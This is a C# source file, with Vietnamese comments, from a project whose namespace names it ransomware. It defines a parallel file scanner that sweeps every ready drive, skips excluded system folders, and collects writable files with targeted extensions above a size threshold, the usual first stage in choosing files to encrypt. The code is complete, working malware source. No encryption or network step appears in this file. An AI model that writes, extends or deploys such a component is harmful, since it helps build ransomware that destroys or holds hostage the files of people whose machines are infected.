// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Ransomware.File;

/// <summary>
/// A highly optimized class for scanning files across the file system with advanced filtering and parallelism.
/// </summary>
internal sealed class FileScanner
{
    private volatile bool isRunning;
    private readonly ParallelOptions parallelOptions;
    private readonly HashSet<string> excludedDirectories; // Thư mục bị loại trừ
    private readonly HashSet<string> allowedFileExtensions; // Định dạng file được phép
    private readonly ConcurrentBag<FileDetail> scannedFiles; // Danh sách file thread-safe
    private readonly CancellationTokenSource cancellationTokenSource;

    public FileScanner()
    {
        isRunning = false;
        scannedFiles = [];
        cancellationTokenSource = new CancellationTokenSource();
        parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = Math.Max(1, Environment.ProcessorCount / 2), // Sử dụng tối đa CPU
        };

        allowedFileExtensions = FileOptions.AllowedFileExtensions;
        excludedDirectories = new HashSet<string>(FileOptions.GetSkippedFolders(), StringComparer.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Scans the file system for files based on specified criteria.
    /// </summary>
    /// <param name="rootPath">The root directory to start scanning (default: all drives).</param>
    /// <param name="minimumSize">Minimum file size in bytes (default: 1MB).</param>
    /// <param name="sortOrder">Order to sort the results.</param>
    /// <param name="fileExtensions">Optional specific file extensions to filter (overrides defaults).</param>
    /// <returns>A list of scanned FileDetail objects.</returns>
    public List<FileDetail> Scan(
        string? rootPath = null,
        long minimumSize = 1024 * 1024,
        SortOrder sortOrder = SortOrder.Ascending,
        HashSet<string>? fileExtensions = null)
    {
        if (isRunning)
            throw new InvalidOperationException("A scan is already in progress.");

        isRunning = true;
        scannedFiles.Clear();

        try
        {
            // Sử dụng fileExtensions nếu được cung cấp, nếu không dùng mặc định
            var extensionsToUse = fileExtensions ?? allowedFileExtensions;
            if (extensionsToUse == null || extensionsToUse.Count == 0)
            {
                throw new ArgumentException("No file extensions specified for scanning.");
            }

            // Xác định thư mục gốc
            IEnumerable<string> rootDirectories = rootPath != null
                ? [rootPath]
                : DriveInfo.GetDrives()
                    .Where(d => d.IsReady)
                    .Select(d => d.RootDirectory.FullName);

            // Quét song song trên tất cả ổ đĩa hoặc thư mục gốc
            Parallel.ForEach(
                rootDirectories,
                parallelOptions,
                (rootDir, state) =>
                {
                    if (cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        state.Stop();
                        return;
                    }
                    ScanDirectory(rootDir, extensionsToUse, minimumSize);
                });

            // Lấy kết quả và sắp xếp
            var results = scannedFiles.Where(f => f.Size >= minimumSize);
            return sortOrder switch
            {
                SortOrder.Ascending => [.. results.OrderBy(f => f.Size)],
                SortOrder.Descending => [.. results.OrderByDescending(f => f.Size)],
                SortOrder.ByNameAscending => [.. results.OrderBy(f => f.FileName)],
                SortOrder.ByNameDescending => [.. results.OrderByDescending(f => f.FileName)],
                _ => throw new NotSupportedException("Invalid sort order specified.")
            };
        }
        finally
        {
            isRunning = false;
        }
    }

    /// <summary>
    /// Cancels an ongoing scan operation.
    /// </summary>
    public void CancelScan()
    {
        if (isRunning)
            cancellationTokenSource.Cancel();
    }

    private void ScanDirectory(string path, HashSet<string> extensions, long minimumSize)
    {
        try
        {
            if (excludedDirectories.Contains(path) ||
                excludedDirectories.Any(ex => path.StartsWith(ex, StringComparison.OrdinalIgnoreCase)))
            {
                return;
            }

            // Quét file trong thư mục hiện tại
            var files = Directory.EnumerateFiles(path, "*.*", SearchOption.TopDirectoryOnly)
                .Where(file => extensions.Contains(Path.GetExtension(file), StringComparer.OrdinalIgnoreCase))
                .Select(file => new FileInfo(file))
                .Where(fi => !fi.IsReadOnly && fi.Length >= minimumSize);

            foreach (var fileInfo in files)
            {
                if (cancellationTokenSource.Token.IsCancellationRequested) return;
                scannedFiles.Add(new FileDetail(fileInfo.FullName, fileInfo.Length));
            }

            // Quét đệ quy thư mục con
            var subDirs = Directory.EnumerateDirectories(path, "*.*", SearchOption.TopDirectoryOnly)
                .Where(dir => !excludedDirectories.Any(ex => dir.StartsWith(ex, StringComparison.OrdinalIgnoreCase)));

            Parallel.ForEach(
                subDirs,
                parallelOptions,
                subDir =>
                {
                    if (!cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        ScanDirectory(subDir, extensions, minimumSize);
                    }
                });
        }
        catch (UnauthorizedAccessException)
        {
            // Bỏ qua các thư mục/file không có quyền truy cập
        }
        catch (DirectoryNotFoundException)
        {
            // Bỏ qua thư mục không tồn tại
        }
        catch (IOException)
        {
            // Bỏ qua lỗi I/O
        }
    }
}